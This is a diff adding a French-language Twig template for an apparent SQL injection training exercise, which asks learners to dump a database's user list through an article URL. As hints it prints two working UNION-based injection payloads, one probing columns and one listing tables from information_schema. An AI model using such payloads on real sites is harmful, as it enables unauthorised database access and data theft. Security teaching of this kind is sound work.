@@ -1,0 +1,23 @@
+{% extends 'base.html.twig' %}
+
+{% block body %}
+<h1>SQL Injection (Advanced)</h1>
+<p>L'objectif est d'utiliser une injection SQL pour retourner la liste des utilisateurs en base.</p>
+<p>L'injection devra se faire directement dans l'URL d'un des articles suivantes</p>
+<ul>
+    {% for article in articles %}
+    <li><a href="{{ path('sql_injection_article', {id: article.id}) }}">{{ article.title }}</a></li>
+    {% endfor %}
+</ul>
+
+<p>En indice, voici une méthode pour identifier les parties remplaçable du template</p>
+<code>
+{{ absolute_url(path('sql_injection_article', {id: "null union SELECT 1,2,3"})) }}
+</code>
+<p></p>
+<p>Et voici comment récupérer la liste des tables de la base de données</p>
+<code>
+{{ absolute_url(path('sql_injection_article', {id: "null union SELECT @@Version, cast(group_concat(table_name) as binary), '' FROM information_schema.tables WHERE table_schema=database()"})) }}
+</code>
+
+{% endblock %}
